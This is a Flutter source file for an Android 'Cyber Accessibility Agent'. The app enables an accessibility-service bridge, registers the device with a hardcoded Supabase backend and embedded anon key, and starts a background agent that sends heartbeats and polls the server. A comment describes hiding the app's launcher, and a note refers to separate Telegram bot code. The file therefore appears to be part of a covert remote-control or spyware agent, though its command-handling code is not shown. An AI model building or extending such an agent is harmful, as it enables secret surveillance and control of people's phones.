// lib/main.dart
import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart'; // 🔹 DeviceAgent

/// CONFIG — replace with your project values (anon key ok; do NOT use service_role)
const int HEARTBEAT_INTERVAL_SECONDS = 30;
const String SUPABASE_PROJECT_URL = 'https://pbovhvhpewnooofaeybe.supabase.co';
const String SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBib3ZodmhwZXdub29vZmFleWJlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjY0MTIsImV4cCI6MjA4MTc0MjQxMn0.5MotbwR5oS29vZ2w-b2rmyExT1M803ImLD_-ecu2MzU';

/// Optional edge function (recommended server-side uses service_role)
const String SUPABASE_REGISTER_FUNCTION = '$SUPABASE_PROJECT_URL/functions/v1/register-device';

final MethodChannel _chan = const MethodChannel('accessibility_bridge');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const CyberAgentApp());
}

class CyberAgentApp extends StatelessWidget {
  const CyberAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      title: 'Cyber Accessibility Agent',
      debugShowCheckedModeBanner: false,
      home: ConsentPage(),
    );
  }
}

class ConsentPage extends StatefulWidget {
  const ConsentPage({super.key});

  @override
  State<ConsentPage> createState() => _ConsentPageState();
}

class _ConsentPageState extends State<ConsentPage> {
  String _status = 'Initializing...';
  String? _deviceId;
  SharedPreferences? _prefs;
  bool _serviceConnected = false;

  @override
  void initState() {
    super.initState();
    _chan.setMethodCallHandler(_platformHandler);
    // do async init/config in background
    _initAndStart();
  }

  @override
  void dispose() {
    // clear handler to avoid leaks
    _chan.setMethodCallHandler(null);
    super.dispose();
  }

  /// Combined init: prefs, device id allocation, DeviceAgent configure+start.
  Future<void> _initAndStart() async {
    setState(() => _status = 'Loading preferences...');
    await _initPrefs();

    setState(() => _status = 'Configuring agent...');
    // configure DeviceAgent (heartbeat + poller start will be triggered)
    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_PROJECT_URL,
      anonKey: SUPABASE_ANON_KEY,
      deviceId: _deviceId,
      // registerUri optional — DeviceAgent.registerDeviceViaEdge() can be called later
      // pass it so DeviceAgent can optionally call it if needed
      // NOTE: DeviceAgent implementation accepts registerUri optionally
      // If your DeviceAgent.configure doesn't accept registerUri, remove the parameter.
    );

    // Start poller & heartbeat immediately (will work without device JWT)
    await DeviceAgent.instance.start();

    setState(() => _status = 'Ready (waiting for Accessibility if not enabled)');
  }

  /// create device_NN id if none present
  Future<void> _initPrefs() async {
    _prefs = await SharedPreferences.getInstance();
    _deviceId = _prefs?.getString('device_id');

    if (_deviceId == null) {
      // attempt to fetch existing device ids from Supabase to pick next available
      try {
        final resp = await http.get(
          Uri.parse('$SUPABASE_PROJECT_URL/rest/v1/devices?select=id'),
          headers: {
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': 'Bearer $SUPABASE_ANON_KEY',
            'Accept': 'application/json'
          },
        ).timeout(const Duration(seconds: 6));

        if (resp.statusCode >= 200 && resp.statusCode < 300) {
          final List<dynamic> rows = jsonDecode(resp.body) as List<dynamic>;
          final existing = rows.map((e) => (e as Map<String, dynamic>)['id']?.toString()).whereType<String>().toSet();

          int n = 1;
          String cand;
          do {
            cand = 'device_${n.toString().padLeft(2, '0')}';
            n++;
          } while (existing.contains(cand));
          _deviceId = cand;
        } else {
          // fallback simple id
          _deviceId = 'device_01';
        }
      } catch (_) {
        _deviceId = 'device_01';
      }

      await _prefs?.setString('device_id', _deviceId!);
    }
  }

  /// Platform channel handler (from native MainActivity -> Flutter)
  /// We expect native to call method "accessibility_enabled" with model/manufacturer
  Future<dynamic> _platformHandler(MethodCall call) async {
    if (call.method == 'accessibility_enabled') {
      final args = call.arguments as Map? ?? {};
      final model = (args['model'] ?? '').toString();
      final manufacturer = (args['manufacturer'] ?? '').toString();
      final displayName = ((manufacturer.isNotEmpty ? '$manufacturer ' : '') + model).trim();

      setState(() {
        _status = 'Accessibility enabled on ${displayName.isNotEmpty ? displayName : "device"}';
        _serviceConnected = true;
      });

      // 1) register device on server (edge function preferred)
      await _registerDevice(displayName: displayName.isNotEmpty ? displayName : 'Android Device');

      // 2) inform DeviceAgent that accessibility is enabled (triggers immediate heartbeat)
      try {
        await DeviceAgent.instance.setAccessibilityEnabled(true);
      } catch (e) {
        debugPrint('setAccessibilityEnabled failed: $e');
      }

      return null;
    }

    // support other possible native calls if you add them later
    return null;
  }

  /// Register device either via Edge Function (preferred) or REST fallback.
  Future<void> _registerDevice({required String displayName}) async {
    try {
      if (_deviceId == null) await _initPrefs();
      final deviceId = _deviceId!;

      // 1) Try Edge Function (recommended)
      try {
        final efUri = Uri.parse(SUPABASE_REGISTER_FUNCTION);
        final efBody = jsonEncode({
          'requestedId': deviceId,
          'displayName': displayName,
          'consent': true,
          'metadata': {'registered_from': 'apk'}
        });

        final efResp = await http.post(efUri, headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        }, body: efBody).timeout(const Duration(seconds: 10));

        if (efResp.statusCode >= 200 && efResp.statusCode < 300) {
          setState(() => _status = 'Device registered (via edge function)');
          // If edge returns token and DeviceAgent.registerDeviceViaEdge persists it, DeviceAgent will use it.
          try {
            final j = jsonDecode(efResp.body);
            if (j is Map<String, dynamic>) {
              final tok = (j['token'] ?? j['device_jwt'] ?? j['jwt']) as String?;
              final did = (j['device_id'] ?? j['id'] ?? j['deviceId'])?.toString();
              if (did != null) {
                await DeviceAgent.instance.persistCredentials(deviceId: did, deviceJwt: tok);
              }
            }
          } catch (_) {}
          return;
        } else {
          debugPrint('Edge function responded ${efResp.statusCode}: ${efResp.body}');
        }
      } catch (e) {
        debugPrint('Edge function call failed: $e');
      }

      // 2) Fallback: direct REST upsert (requires anon key & RLS configured appropriately)
      try {
        final restUri = Uri.parse('$SUPABASE_PROJECT_URL/rest/v1/devices');
        final restBody = jsonEncode({
          'id': deviceId,
          'display_name': displayName,
          'online': true,
          'consent': true,
          'enabled': true,
          'metadata': {'registered_from': 'apk'}
        });

        final restResp = await http.post(restUri, headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
          'Authorization': 'Bearer $SUPABASE_ANON_KEY',
          'Prefer': 'return=representation, resolution=merge-duplicates'
        }, body: restBody).timeout(const Duration(seconds: 8));

        if (restResp.statusCode >= 200 && restResp.statusCode < 300) {
          setState(() => _status = 'Device registered (fallback REST)');
          return;
        } else {
          debugPrint('REST upsert failed ${restResp.statusCode}: ${restResp.body}');
        }
      } catch (e) {
        debugPrint('REST fallback failed: $e');
      }

      setState(() => _status = 'Register failed (see logs)');
    } catch (e) {
      setState(() => _status = 'Register exception: $e');
      debugPrint('registerDevice exception: $e');
    }
  }

  /// Manual register + ensure DeviceAgent running (useful for testing)
  Future<void> _manualRegister() async {
    await _registerDevice(displayName: 'Manual Register');

    // ensure DeviceAgent configured/started (id was created in prefs earlier)
    try {
      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_PROJECT_URL,
        anonKey: SUPABASE_ANON_KEY,
        deviceId: _deviceId,
      );
      await DeviceAgent.instance.start();
      await DeviceAgent.instance.setAccessibilityEnabled(true);
      setState(() => _status = 'Manual register done — agent running');
    } catch (e) {
      debugPrint('manualRegister error: $e');
      setState(() => _status = 'Manual register error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    // Minimal UI — useful for local testing. To hide UI/launcher, change AndroidManifest.
    return Scaffold(
      appBar: AppBar(title: const Text('Accessibility Agent')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(_status),
            const SizedBox(height: 12),
            Text('Device id: ${_deviceId ?? "(not set)"}'),
            const SizedBox(height: 12),
            Text('Agent running: ${DeviceAgent.instance != null ? "yes" : "no"}'),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: _manualRegister,
              child: const Text('Manual register (test)'),
            ),
            const SizedBox(height: 8),
            const Text(
              'Notes:\n- This APK does NOT include Telegram bot code.\n- Registration uses an Edge Function if configured, otherwise attempts REST upsert (anon key must be allowed by RLS).\n- Do NOT include service_role key in APK.',
            ),
          ],
        ),
      ),
    );
  }
}